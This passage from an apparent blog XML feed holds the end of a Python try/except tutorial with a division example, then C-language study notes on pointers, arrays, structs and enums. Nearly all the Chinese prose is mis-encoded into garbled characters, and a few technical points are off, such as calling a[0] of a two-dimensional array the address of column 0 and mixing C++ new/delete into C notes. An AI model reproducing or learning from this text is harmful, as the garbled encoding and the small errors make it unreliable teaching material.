<li>å½“ Python è§£é‡Šå™¨æ”¶åˆ°å¼‚å¸¸å¯¹è±¡æ—¶ï¼Œä¼šå¯»æ‰¾èƒ½å¤„ç†è¯¥å¼‚å¸¸å¯¹è±¡çš„ except å—ï¼Œå¦‚æœæ‰¾åˆ°åˆé€‚çš„ except å—ï¼Œåˆ™æŠŠè¯¥å¼‚å¸¸å¯¹è±¡äº¤ç»™è¯¥ except å—å¤„ç†ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºå¤„ç†å¼‚å¸¸ã€‚å¦‚æœ Python è§£é‡Šå™¨æ‰¾ä¸åˆ°å¤„ç†å¼‚å¸¸çš„ except å—ï¼Œåˆ™ç¨‹åºè¿è¡Œç»ˆæ­¢ï¼ŒPython è§£é‡Šå™¨ä¹Ÿå°†é€€å‡º</li>
</ol>
<p>äº‹å®ä¸Šï¼Œä¸ç®¡ç¨‹åºä»£ç å—æ˜¯å¦å¤„äº try å—ä¸­ï¼Œç”šè‡³åŒ…æ‹¬ except å—ä¸­çš„ä»£ç ï¼Œåªè¦æ‰§è¡Œè¯¥ä»£ç å—æ—¶å‡ºç°äº†å¼‚å¸¸ï¼Œç³»ç»Ÿéƒ½ä¼šè‡ªåŠ¨ç”Ÿæˆå¯¹åº”ç±»å‹çš„å¼‚å¸¸ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ­¤æ®µç¨‹åºæ²¡æœ‰ç”¨ try åŒ…è£¹ï¼Œåˆæˆ–è€…æ²¡æœ‰ä¸ºè¯¥å¼‚å¸¸é…ç½®å¤„ç†å®ƒçš„ except å—ï¼Œåˆ™ Python è§£é‡Šå™¨å°†æ— æ³•å¤„ç†ï¼Œç¨‹åºå°±ä¼šåœæ­¢è¿è¡Œï¼›åä¹‹ï¼Œå¦‚æœç¨‹åºå‘ç”Ÿçš„å¼‚å¸¸ç» try æ•è·å¹¶ç”± except å¤„ç†å®Œæˆï¼Œåˆ™ç¨‹åºå¯ä»¥ç»§ç»­æ‰§è¡Œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    a = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¾“å…¥è¢«é™¤æ•°ï¼š&quot;</span>))<br>    b = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¾“å…¥é™¤æ•°ï¼š&quot;</span>))<br>    c = a / b<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ‚¨è¾“å…¥çš„ä¸¤ä¸ªæ•°ç›¸é™¤çš„ç»“æœæ˜¯ï¼š&quot;</span>, c )<br><span class="hljs-keyword">except</span> (ValueError, ArithmeticError):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¨‹åºå‘ç”Ÿäº†æ•°å­—æ ¼å¼å¼‚å¸¸ã€ç®—æœ¯å¼‚å¸¸ä¹‹ä¸€&quot;</span>)<br><span class="hljs-keyword">except</span> :<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æœªçŸ¥å¼‚å¸¸&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¨‹åºç»§ç»­è¿è¡Œ&quot;</span>)<br></code></pre></td></tr></table></figure>

<figure class="highlight brainfuck"><table><tr><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</span><br><span class="hljs-comment">è¾“å…¥è¢«é™¤æ•°ï¼ša</span><br><span class="hljs-comment">ç¨‹åºå‘ç”Ÿäº†æ•°å­—æ ¼å¼å¼‚å¸¸ã€ç®—æœ¯å¼‚å¸¸ä¹‹ä¸€</span><br><span class="hljs-comment">ç¨‹åºç»§ç»­è¿è¡Œ</span><br></code></pre></td></tr></table></figure>

<p>ä¸Šé¢ç¨‹åºä¸­ï¼Œç¬¬ 6 è¡Œä»£ç ä½¿ç”¨äº†ï¼ˆValueError, ArithmeticErrorï¼‰æ¥æŒ‡å®šæ‰€æ•è·çš„å¼‚å¸¸ç±»å‹ï¼Œè¿™å°±è¡¨æ˜è¯¥ except å—å¯ä»¥åŒæ—¶æ•è·è¿™ 2 ç§ç±»å‹çš„å¼‚å¸¸ï¼›ç¬¬ 8 è¡Œä»£ç åªæœ‰ except å…³é”®å­—ï¼Œå¹¶æœªæŒ‡å®šå…·ä½“è¦æ•è·çš„å¼‚å¸¸ç±»å‹ï¼Œè¿™ç§çœç•¥å¼‚å¸¸ç±»çš„ except è¯­å¥ä¹Ÿæ˜¯åˆæ³•çš„ï¼Œå®ƒè¡¨ç¤ºå¯æ•è·æ‰€æœ‰ç±»å‹çš„å¼‚å¸¸ï¼Œä¸€èˆ¬ä¼šä½œä¸ºå¼‚å¸¸æ•è·çš„æœ€åä¸€ä¸ª except å—ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œç”±äº try å—ä¸­å¼•å‘äº†å¼‚å¸¸ï¼Œå¹¶è¢« except å—æˆåŠŸæ•è·ï¼Œå› æ­¤ç¨‹åºæ‰å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œæ‰æœ‰äº†â€œç¨‹åºç»§ç»­è¿è¡Œâ€çš„è¾“å‡ºç»“æœã€‚</p>
]]></content>
  </entry>
  <entry>
    <title>cè¯­è¨€â€”â€”â€”â€”æŒ‡é’ˆä¸æ–‡ä»¶éšæ‰‹è®°</title>
    <url>/2020/10/24/2020-10-24-c%E8%AF%AD%E8%A8%80%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E6%8C%87%E9%92%88%E4%B8%8E%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="æŒ‡é’ˆ"><a href="#æŒ‡é’ˆ" class="headerlink" title="æŒ‡é’ˆ"></a>æŒ‡é’ˆ</h1><h3 id="ä¸€ã€æŒ‡é’ˆä¸æŒ‡é’ˆå˜é‡"><a href="#ä¸€ã€æŒ‡é’ˆä¸æŒ‡é’ˆå˜é‡" class="headerlink" title="ä¸€ã€æŒ‡é’ˆä¸æŒ‡é’ˆå˜é‡"></a>ä¸€ã€æŒ‡é’ˆä¸æŒ‡é’ˆå˜é‡</h3><p>1ã€å˜é‡çš„æŒ‡é’ˆï¼šå˜é‡åœ¨å†…å­˜ä¸­åˆ†é…åˆ°çš„å­˜å‚¨å•å…ƒä¸­çš„é¦–åœ°å€</p>
<p>2ã€æŒ‡é’ˆå˜é‡ï¼šå˜é‡æ‰€åˆ†é…åˆ°çš„å­˜å‚¨å•å…ƒç”¨æ¥å­˜æ”¾å…¶ä»–å˜é‡çš„åœ°å€ï¼ˆæŒ‡é’ˆï¼‰</p>
<p>3ã€æŒ‡é’ˆå˜é‡å®šä¹‰æ ¼å¼ï¼š*<em>ç±»å‹æ ‡è¯†ç¬¦ <em>æŒ‡é’ˆå˜é‡å;</em></em>  </p>
<p><em><em>å¦ï¼šå¦‚(int</em>)pè¿™æ ·çš„å†™æ³•ï¼Œè¡¨ç¤ºæŠŠä¸€ä¸ªæŒ‡é’ˆpæ‰€æŒ‡å‘çš„ç±»å‹å¼ºåˆ¶è½¬æ¢ä¸ºæ•´å‹</em>*</p>
<p>4ã€å®šä¹‰ä¸ºä»€ä¹ˆç±»å‹çš„æŒ‡é’ˆå˜é‡ï¼Œåˆ™åªèƒ½æŒ‡å‘è¯¥ç±»å‹çš„å˜é‡çš„åœ°å€ï¼Œå¦åˆ™å°†å‡ºé”™</p>
<p>5ã€æŒ‡é’ˆå˜é‡çš„èµ‹å€¼ï¼š</p>
<p>ï¼ˆ1ï¼‰ä½¿ç”¨&amp;ç¬¦å·è¿›è¡Œèµ‹å€¼ï¼šå¦‚<strong>ip=&amp;i</strong>ï¼ˆipä¸ºæŒ‡é’ˆå˜é‡ã€‚iä¸ºæŸå˜é‡ï¼‰</p>
<p>ï¼ˆ2ï¼‰åˆå§‹åŒ–ï¼š<strong>å¦‚int gï¼Œ*ip=&amp;g</strong></p>
<p>ï¼ˆ3ï¼‰ä¸åŒæŒ‡é’ˆå˜é‡é—´çš„èµ‹å€¼ï¼š<strong>ip1=ip2</strong>ï¼ˆip1ï¼Œip2ä¸ºæŒ‡é’ˆå˜é‡ï¼Œ<strong>ä¸”ä¸¤è€…æŒ‡å‘çš„æ•°æ®ç±»å‹å¿…é¡»ç›¸åŒ</strong>ï¼‰</p>
<p>ï¼ˆ4ï¼‰ä½¿ç”¨NULLèµ‹ç©ºå€¼ï¼Œå¯ä»¥ç»™æŒ‡å‘ä»»ä½•æ•°æ®ç±»å‹çš„æŒ‡é’ˆå˜é‡èµ‹ç©ºå€¼ï¼š<strong>p=NULL;</strong></p>
<p>ï¼ˆ5ï¼‰åŠ¨æ€åˆ†é…å­˜å‚¨ç©ºé—´ï¼šä½¿ç”¨newèµ‹å€¼ï¼šæ ¼å¼ä¸ºï¼š<strong>ip=new ç±»å‹å æˆ– ip=new ç±»å‹å[ä¸ªæ•°]<strong>ï¼ˆä¸ªæ•°ä»£è¡¨è¯¥æŒ‡é’ˆå˜é‡å¯åˆ†é…åˆ°å¤šå°‘ä¸ªçš„æŸç±»å‹çš„å­˜å‚¨å•å…ƒï¼Œç±»å‹å¯ä»¥æ˜¯ç»“æ„ä½“å˜é‡åã€‚å¦</strong>ipé¦–å…ˆå¿…é¡»æ˜¯è¯¥ç±»å‹çš„æŒ‡é’ˆå˜é‡</strong>ï¼‰</p>
<p>ï¼ˆ6ï¼‰deleteåˆ å»newçš„åˆ›å»ºå¯¹è±¡é‡Šæ”¾å…¶æ‰€å æœ‰çš„ç©ºé—´ï¼Œæ ¼å¼ä¸ºï¼š<strong>delete ip æˆ– delete [ ]ip</strong> ï¼ˆåè€…åˆ å»æ‹¥æœ‰ä¸æ­¢ä¸€å—å­˜å‚¨å•å…ƒçš„æŒ‡é’ˆå˜é‡ï¼Œå¹¶ä¸”æ ¼å¼å°±æ˜¯å¦‚æ­¤ï¼Œ[]å†…æ²¡æœ‰å…¶ä»–çš„ä¸œè¥¿ï¼‰</p>
<p>6ã€å¦‚æœ p=&amp;i ï¼› é‚£ä¹ˆ*på°±ç­‰ä»·äºi ï¼Œ *&amp;iä¹Ÿç­‰ä»·äºiï¼ˆç†è§£ä¸ºï¼Œpé‡Œé¢å­˜å‚¨ç€å˜é‡çš„åœ°å€ï¼Œè€ŒæŒ‡é’ˆç¬¦å·æ˜¯æŒ‡å‘è¯¥åœ°å€ã€‚æ‰€ä»¥ï¼Œå¦‚æœæŒ‡é’ˆæœªèµ‹å€¼æ—¶ï¼Œ *ipå¯è®¤ä¸ºæ˜¯ä¸€ä¸ªæœªèµ‹å€¼çš„å˜é‡ï¼‰</p>
<p>7ã€å¦‚æœä½¿ç”¨ï¼ˆ*ipï¼‰++æ—¶ï¼Œæ˜¯å¦æœ‰åœ†æ‹¬å·è¡¨è¾¾ä¸ä¸€æ ·çš„æ„æ€ï¼š</p>
<p>æœ‰åœ†æ‹¬å·æ—¶ï¼šå…ˆ*å’Œipç»“åˆï¼Œè¡¨ç¤ºçš„æ˜¯æŒ‡é’ˆipæŒ‡å‘åœ°å€çš„å˜é‡åœ¨ä½¿ç”¨åæ•°å€¼åŠ 1</p>
<p>æ— åœ†æ‹¬å·æ—¶ï¼šipå…ˆä¸++ç»“åˆï¼Œåˆ++åœ¨åè¾¹ï¼Œåˆ™åœ¨ä½¿ç”¨å®Œ*ipåæŠŠipçš„å€¼åŠ 1ï¼Œå³ä¸ºipæŒ‡å‘çš„ä¸å†æ˜¯åŸæœ¬å˜é‡ï¼Œè€Œæ˜¯åœ°å€æ›´é«˜çš„ç›¸é‚»å˜é‡</p>
<ul>
<li>æŒ‡é’ˆå¸¸é‡ï¼šæŒ‡å‘çš„æ•°æ®æ˜¯å¸¸é‡ã€‚å¦‚ const char* p = â€œabcâ€; pæŒ‡å‘çš„å†…å®¹æ˜¯å¸¸é‡ ï¼Œä½†pæœ¬èº«ä¸æ˜¯å¸¸é‡ï¼Œä½ å¯ä»¥è®©på†æŒ‡å‘â€123â€ã€‚ </li>
<li>å¸¸é‡æŒ‡é’ˆï¼šæŒ‡é’ˆæœ¬èº«æ˜¯å¸¸é‡ã€‚å¦‚ï¼šchar* const p = â€œabcâ€; pæœ¬èº«å°±æ˜¯å¸¸é‡ï¼Œä½ ä¸èƒ½è®©på†æŒ‡å‘â€123â€ã€‚ </li>
<li>æŒ‡é’ˆå¸¸é‡ + å¸¸é‡æŒ‡é’ˆï¼šæŒ‡é’ˆå’ŒæŒ‡é’ˆæŒ‡å‘çš„æ•°æ®éƒ½æ˜¯å¸¸é‡ã€‚const char* const p =â€abcâ€; ä¸¤è€…éƒ½æ˜¯å¸¸é‡ï¼Œä¸èƒ½å†ä¿®æ”¹ã€‚</li>
</ul>
<h3 id="äºŒã€æŒ‡é’ˆä¸æ•°ç»„"><a href="#äºŒã€æŒ‡é’ˆä¸æ•°ç»„" class="headerlink" title="äºŒã€æŒ‡é’ˆä¸æ•°ç»„"></a>äºŒã€æŒ‡é’ˆä¸æ•°ç»„</h3><p>1ã€æ•°ç»„åæ˜¯ä¸€ä¸ªæ•°ç»„çš„é¦–åœ°å€ï¼Œä¾‹å¦‚ä¸€ç»´æ•°ç»„aä¸­aä¸&amp;a[0]éƒ½è¡¨ç¤ºæ•°ç»„çš„é¦–åœ°å€ï¼ˆä¸€ç»´æ•°ç»„ä¸­a[0]åªè¡¨ç¤ºå…ƒç´ ï¼ŒäºŒç»´æ•°ç»„ä¸­a[0]è¡¨ç¤ºç¬¬0åˆ—çš„é¦–åœ°å€ï¼‰</p>
<p>2ã€æ•°ç»„çš„é¦–åœ°å€æ˜¯<em><strong>å¸¸é‡</strong></em>ï¼Œä¸èƒ½è¢«æ”¹å˜</p>
<p>3ã€cè¯­è¨€ä¸­è§„å®šï¼š<strong>ä¸€ç»´æ•°ç»„ä¸­a[i]çš„åœ°å€æ˜¯a+iï¼Œå¦‚æœip=aï¼Œé‚£ä¹ˆä¹Ÿå¯å†™æˆip+iï¼ˆæ„æˆäº†å¾ªç¯æ¡ä»¶ï¼Œå¦‚æœæ˜¯æŒ‡é’ˆï¼Œè¿˜å¯ä»¥ç›´æ¥å†™æˆip++ï¼Œå› ä¸ºæŒ‡é’ˆå˜é‡ä¸æ˜¯å¸¸æ•°ï¼‰</strong></p>
<p>4ã€å½“æŒ‡é’ˆå˜é‡ipå–äº†æ•°ç»„açš„åœ°å€çš„æ—¶ï¼Œé‚£ä¹ˆip[i]ä¸a[i]è¡¨ç¤ºçš„å…ƒç´ ä¸€è‡´ï¼Œå¯<strong>çœ‹ä¸º</strong>ä¸€ä¸ªæ•°ç»„åœ¨èµ·ä½œç”¨</p>
<p>5ã€æŒ‡é’ˆå˜é‡å¯è¿›è¡ŒåŠ å‡æ•´æ•°å’Œä¸¤æŒ‡é’ˆç›¸å‡çš„ç®—æœ¯è¿ç®—</p>
<p>ï¼ˆ1ï¼‰ç§»åŠ¨æŒ‡é’ˆï¼ˆæŒ‡é’ˆåŠ å‡æ•´æ•°ï¼‰ ä¾‹å¦‚ip+1æˆ–è€…ip-1çœ‹ä¼¼æ˜¯åŠ å‡1å°±æŒ‡å‘äº†ä¸´è¿‘çš„å­˜å‚¨å•å…ƒï¼Œä½†æ˜¯å®è´¨æ˜¯åŠ å‡çš„æ•°ä¼šä¹˜ä»¥æ•°æ®ç±»å‹æ‰€å æ®çš„å­—èŠ‚æ•°ï¼Œå› ä¸ºä¸€ä¸ªå­—èŠ‚å°±æ˜¯ä¸€ä¸ªå­˜å‚¨å•å…ƒï¼Œæ‰€ä»¥è¿™é‡Œçš„1ï¼Œæˆ‘å°†ä¹‹ç†è§£ä¸ºä¸€<strong>å—</strong>å­˜å‚¨å•å…ƒ</p>
<p>ï¼ˆ2ï¼‰ä¸¤æŒ‡é’ˆç›¸å‡ï¼šæŒ‡å‘åŒä¸€å—è¿ç»­çš„å­˜å‚¨å•å…ƒï¼ˆæ•°ç»„ï¼‰çš„ä¸¤ä¸ªæŒ‡é’ˆå˜é‡å¯ä»¥ç›¸å‡ï¼ˆp-qï¼‰ï¼Œå€¼ä»£è¡¨ä¸¤ä¸ªæŒ‡é’ˆå˜é‡ä¹‹é—´çš„ç›¸è·çš„å…ƒç´ ä¸ªæ•°ï¼Œå¯ä»¥ä¸ºè´Ÿæ•°</p>
<p>6ã€æŒ‡å‘åŒä¸€å—è¿ç»­çš„å­˜å‚¨å•å…ƒï¼ˆæ•°ç»„ï¼‰çš„æŒ‡é’ˆé—´å¯ä»¥è¿›è¡Œæ¯”è¾ƒï¼ˆä½¿ç”¨æ‰€æŒ‡å‘çš„æ•°ç»„å…ƒç´ çš„åœ°å€å¤§å°è¿›è¡Œæ¯”è¾ƒï¼‰</p>
<p>7ã€å­—ç¬¦æŒ‡é’ˆå®šä¹‰ä¸ºï¼š<em><em>char <em>spï¼›sp=â€œOK!â€</em></em> ï¼Œä»¥ä¸ŠæŠŠOK!è¿™ä¸ªå­—ç¬¦ä¸²çš„é¦–å­—ç¬¦çš„åœ°å€èµ‹å€¼ç»™å­—ç¬¦æŒ‡é’ˆï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨spè¿™ä¸ªå­—ç¬¦æŒ‡é’ˆå­˜å–è¯¥å­—ç¬¦ä¸²ï¼Œæ­¤æ—¶ä¸å­—ç¬¦ä¸²æ•°ç»„ç›¸ä¼¼ï¼Œsp[1]çš„å€¼ä¸ºKï¼Œå¹¶ä¸”ä¸å­—ç¬¦ä¸²æ•°ç»„ä¸€è‡´ï¼ŒåŒæ ·æ˜¯</em><em>ä»¥ç©ºå­—ç¬¦ç»“å°¾</em>*</p>
<p>8ã€å½“æƒ³ä½¿ç”¨scanfè¾“å…¥å‡½æ•°ä¸ºå­—ç¬¦æŒ‡é’ˆå˜é‡èµ‹å€¼æ—¶ï¼Œå­—ç¬¦æŒ‡é’ˆå˜é‡æ­¤æ—¶ä¸€å®šè¦èƒ½æŒ‡å‘æŸä¸ªç¡®å®šçš„åœ°å€ï¼Œæ¯”å¦‚æŠŠå­—ç¬¦æ•°ç»„çš„åœ°å€èµ‹ç»™å­—ç¬¦æŒ‡é’ˆï¼Œå¦åˆ™ï¼Œå­—ç¬¦æŒ‡é’ˆå°†æŒ‡å‘ä»»æ„åœ°å€ï¼Œå¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒ</p>
<p>9ã€æŒ‡é’ˆä¸€æ—¦æŒ‡å‘æŸä¸ªåœ°å€æ—¶ï¼Œå»æ”¹å˜å¦‚*ipçš„ä»»ä½•å€¼ï¼Œéƒ½æ˜¯ç›¸å½“äºæ”¹å˜å…¶æŒ‡å‘çš„åœ°å€æ‰€å¯¹åº”çš„æ•°ç»„ã€å˜é‡ç­‰</p>
<p>10ã€äºŒç»´æ•°ç»„ä¸­çš„æ¯è¡Œçš„é¦–åœ°å€ä¸ºå…¶é¦–ä¸ªå…ƒç´ ï¼Œä¾‹å¦‚a[3] [5],ç¬¬0è¡Œçš„é¦–åœ°å€ä¸ºa[0]ï¼ˆæˆ–è€…ä¸ºaï¼‰,ç¬¬1è¡Œé¦–åœ°å€ä¸ºa[1]ï¼ˆæˆ–è€…ä¸ºa+1ï¼‰</p>
<p>è€Œ0è¡Œç¬¬jåˆ—å…ƒç´ çš„åœ°å€ä¸ºa[0]+jï¼ˆæˆ–è€…è¡¨ç¤ºä¸º*a+jï¼‰ï¼Œç¬¬1è¡Œjåˆ—å…ƒç´ çš„åœ°å€ä¸ºa[1]+jï¼ˆæˆ–è€…è¡¨ç¤ºä¸º *(a+1)+jï¼‰</p>
<p>æ¨å¹¿åˆ°iè¡Œï¼Œjåˆ—çš„åœ°å€åˆ™ä¸ºa[i]+jï¼›*(a+i)+jï¼›&amp;a[i] [j] ã€‚è‹¥æ˜¯è¦è¡¨ç¤ºa[i] [j]åˆ™åœ¨å‰é¢çš„è¡¨è¾¾å¼åŠ  *()</p>
<p>11ã€ä½¿ç”¨ç®€å•åŒç±»å‹æŒ‡é’ˆå˜é‡å­˜å–äºŒç»´æ•°ç»„æ—¶ï¼Œç»™æŒ‡é’ˆpèµ‹äºˆé¦–åœ°å€ï¼šp=&amp;a[0] [0]ï¼›p=*aï¼›p=a[0]ï¼ˆä¸å¯ä»¥ç”¨æ•°ç»„åè¿›è¡Œèµ‹å€¼ï¼‰</p>
<p>ä½¿ç”¨pæŒ‡å‘a[i] [j]ä¸º*(p+i *åˆ—çš„æ€»æ•°+j) </p>
<p>12ã€int (*pi)[5]è¡¨ç¤ºï¼Œå®šä¹‰ä¸€ä¸ªæ•´å‹æŒ‡é’ˆï¼ˆç§°ä¸ºè¡ŒæŒ‡é’ˆï¼‰ï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªå«æœ‰äº”ä¸ªæ•´å‹å…ƒç´ çš„æ•°ç»„</p>
<p>13ã€å¦‚æœæœ‰ä¸€ä¸ªäºŒç»´æ•°ç»„åˆ—æ•°ä¹Ÿä¸ºç¬¬12ç‚¹ä¸­çš„5åˆ—æ—¶ï¼Œæ­¤æ—¶å¯ä»¥æ‰§è¡Œpi=aï¼Œåˆ™æ­¤æ—¶ç”¨piå­˜å–äºŒç»´æ•°ç»„çš„ç”¨æ³•ä¸10ä¸­ä¸€è‡´</p>
<p>14ã€å®šä¹‰æŒ‡é’ˆæ•°ç»„ï¼š*<em>ç±»å‹æ ‡è¯†ç¬¦ <em>æŒ‡é’ˆå[å…ƒç´ ä¸ªæ•°]</em></em> å¦‚æœæŠŠä¸€ä¸ªäºŒç»´æ•°ç»„çš„æ¯è¡Œçš„é¦–åœ°å€éƒ½ç»™æŒ‡é’ˆæ•°ç»„ç›¸åº”çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆåˆ™å­˜å–äºŒç»´æ•°ç»„çš„æ–¹æ³•ä¸10ä¸­ä¸€è‡´</p>
<p>15ã€ä½¿ç”¨æŒ‡é’ˆå­—ç¬¦æ•°ç»„ï¼š*<em>char <em>p[å­—ç¬¦ä¸²ä¸ªæ•°]=ï½›å­—ç¬¦ä¸²ï½</em></em> ä¼šä¸ºæ¯ä¸ªå­—ç¬¦ä¸²åˆ†é…ç›¸åº”çš„ç©ºé—´ï¼Œä¸ä¼šé€ æˆç©ºé—´çš„æµªè´¹ï¼Œç”¨æ³•ä¸å­—ç¬¦ä¸²æ•°ç»„ä¸€è‡´</p>
<p>16ã€äºŒç»´å­—ç¬¦ä¸²æ•°ç»„ï¼Œæ¯è¡Œçš„é¦–åœ°å€è¾“å‡ºæ—¶å°±è¡¨ç¤ºä¸€æ•´è¡Œçš„å­—ç¬¦ä¸²ï¼ˆçœ‹æˆä¸€ä¸ªä¸€ç»´çš„å­—ç¬¦ä¸²æ•°ç»„ï¼‰</p>
<h3 id="ä¸‰ã€æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆå˜é‡"><a href="#ä¸‰ã€æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆå˜é‡" class="headerlink" title="ä¸‰ã€æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆå˜é‡"></a>ä¸‰ã€æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆå˜é‡</h3><p>1ã€æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆå˜é‡ï¼šé€šè¿‡å¤šæ¬¡ï¼ˆä¸€èˆ¬ä¸ºä¸¤æ¬¡ï¼‰æŒ‡å‘åœ°å€ï¼Œä»è€ŒæŒ‡å‘æœ€ç»ˆçš„ä¸€ä¸ªå˜é‡å€¼</p>
<p>æ ¼å¼ä¸ºï¼š<strong>ç±»å‹æ ‡è¯†ç¬¦  * * æŒ‡é’ˆå˜é‡åï¼›</strong></p>
<p>2ã€å¯ä»¥æŠŠä¸€ä¸ªæŒ‡é’ˆæ•°ç»„çš„é¦–åœ°å€èµ‹å€¼ç»™æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆå˜é‡ï¼ˆå¾ˆå¥½ç†è§£ï¼šæŒ‡é’ˆæ•°ç»„é‡Œé¢çš„æŒ‡é’ˆå…ƒç´ å°±ä»£è¡¨ç€åœ°å€ï¼Œè€ŒæŒ‡é’ˆæ•°ç»„é¦–åœ°å€æŒ‡å‘è¿™äº›ï¼Œç±»ä¼¼äºæŒ‡å‘æŒ‡é’ˆï¼‰</p>
<h3 id="å››ã€æŒ‡é’ˆä¸ç»“æ„ä½“ã€å…±ç”¨ä½“"><a href="#å››ã€æŒ‡é’ˆä¸ç»“æ„ä½“ã€å…±ç”¨ä½“" class="headerlink" title="å››ã€æŒ‡é’ˆä¸ç»“æ„ä½“ã€å…±ç”¨ä½“"></a>å››ã€æŒ‡é’ˆä¸ç»“æ„ä½“ã€å…±ç”¨ä½“</h3><p>æ³¨ï¼šç»“æ„ä½“ä¸å…±ç”¨ä½“è¾ƒä¸ºç±»ä¼¼ï¼Œä¸æŒ‡é’ˆçš„ç”¨æ³•ä¸€è‡´ï¼Œæ•…ä»¥ä¸‹åªæä¾›ä¸€ç§</p>
<p>1ã€æŒ‡å‘ç»“æ„ä½“ï¼šç»“æ„ä½“åŒæ ·å­˜åœ¨è¿ç»­ç©ºé—´ï¼Œä»¥åŠé¦–åœ°å€ï¼ŒæŠŠè¿™ä¸ªé¦–åœ°å€èµ‹å€¼ç»™ä¸€ä¸ªæŒ‡é’ˆå˜é‡ï¼Œåˆ™è¯¥æŒ‡é’ˆæŒ‡å‘ç»“æ„ä½“</p>
<p>æ ¼å¼ï¼š**struct ç»“æ„ä½“å *æŒ‡é’ˆå˜é‡å**ï¼ˆc++ä¸­å¯çœç•¥structï¼‰</p>
<p>2ã€è‹¥æœ‰ä¸€ä¸ªä¸æŒ‡é’ˆåŒä¸ªç»“æ„ä½“ç±»å‹çš„ç»“æ„ä½“å˜é‡bookï¼Œåˆ™æŒ‡é’ˆå˜é‡<strong>p=&amp;book</strong>ï¼Œæ­¤æ—¶ï¼ŒpæŒ‡å‘äº†bookï¼›å…±æœ‰ä¸‰ç§åŠæ³•å­˜å–ç»“æ„ä½“ä¸­çš„æˆå‘˜ï¼š</p>
<p>ï¼ˆ1ï¼‰<strong>book.æˆå‘˜å</strong> å­¦ç»“æ„ä½“çš„æœ€åŸºæœ¬çš„å–ç”¨è¯­æ³•</p>
<p>ï¼ˆ2ï¼‰<strong>p-&gt;æˆå‘˜å</strong> æŒ‡é’ˆçš„å–ç”¨è¯­æ³•ï¼Œå€Ÿç”¨ç”±-å’Œ&gt;ç»„åˆæˆçš„æŒ‡å‘è¿ç®—ç¬¦å–ç”¨æˆå‘˜ï¼ˆå¸¸ç”¨ï¼‰</p>
<p>ï¼ˆ3ï¼‰**(<em>p).æˆå‘˜å</em>* åœ†æ‹¬å·ä¸å¯çœç•¥ï¼Œå› ä¸ºæ ¹æ®è¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼Œ â€œ . â€  çš„ä¼˜å…ˆçº§é«˜äºâ€œ*â€</p>
<p>3ã€å¦‚æœæ˜¯ç»“æ„ä½“æ•°ç»„book[i]ï¼Œp=bookï¼Œé‚£ä¹ˆpæŒ‡å‘book[0]ï¼Œ(p+1)æŒ‡å‘book[1]Â·Â·Â·Â·Â·Â·</p>
<p>4ã€æŒ‡é’ˆå˜é‡æŒ‡å‘å¸¦æœ‰ä½æ®µçš„ç»“æ„ä½“å˜é‡æ—¶ï¼Œç”¨æ³•ä¸æŒ‡å‘ç»“æ„ä½“ä¸€è‡´</p>
<h3 id="äº”ã€æŒ‡é’ˆä¸æšä¸¾å‹"><a href="#äº”ã€æŒ‡é’ˆä¸æšä¸¾å‹" class="headerlink" title="äº”ã€æŒ‡é’ˆä¸æšä¸¾å‹"></a>äº”ã€æŒ‡é’ˆä¸æšä¸¾å‹</h3><p>1ã€æŒ‡å‘æšä¸¾å‹çš„æŒ‡é’ˆçš„å®šä¹‰ä¸ç»“æ„ä½“ã€å…±ç”¨ä½“ä¸€è‡´ï¼Œå°±ä¸å†é‡å¤è¯´æ˜</p>
<p>2ã€æŒ‡å‘æšä¸¾å‹çš„æŒ‡é’ˆï¼Œç”¨æ³•å°±ä¸€ä¸ªï¼š*<strong>pç­‰ä»·äºe</strong>ï¼ˆpä¸ºæŒ‡é’ˆï¼Œeä¸ºæšä¸¾å‹å˜é‡ï¼‰</p>
<p>3ã€è¡¥å……å‰é¢çš„æšä¸¾å‹ï¼šæ¯ä¸ªæšä¸¾å‹é‡Œé¢çš„æšä¸¾å€¼ï¼Œéƒ½ä»£è¡¨ç€ä¸€ä¸ªæ•´æ•°ï¼ŒæŸç§æ„ä¹‰ä¸Šæ¥è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªæ•´å‹çš„æ•°ï¼Œæ‰€ä»¥æ‰ä¼šæœ‰ç±»å‹å¼ºåˆ¶ç±»å‹è½¬åŒ–çš„è¯­æ³•<strong>ï¼ˆenum æšä¸¾ç±»å‹åï¼‰ï¼ˆæšä¸¾å˜é‡+æˆ–-å¸¸æ•°ï¼‰</strong></p>
<p>æ‰€ä»¥ï¼Œ*pçš„è¡¨ç¤ºï¼Œå¯ä»¥æŒ‡å‘æŸä¸ªæšä¸¾å€¼ï¼Œä¹Ÿå¯ä»¥è¢«è½¬åŒ–ä¸ºè¯¥æšä¸¾å€¼å¯¹åº”çš„æ•´å‹æ•°</p>
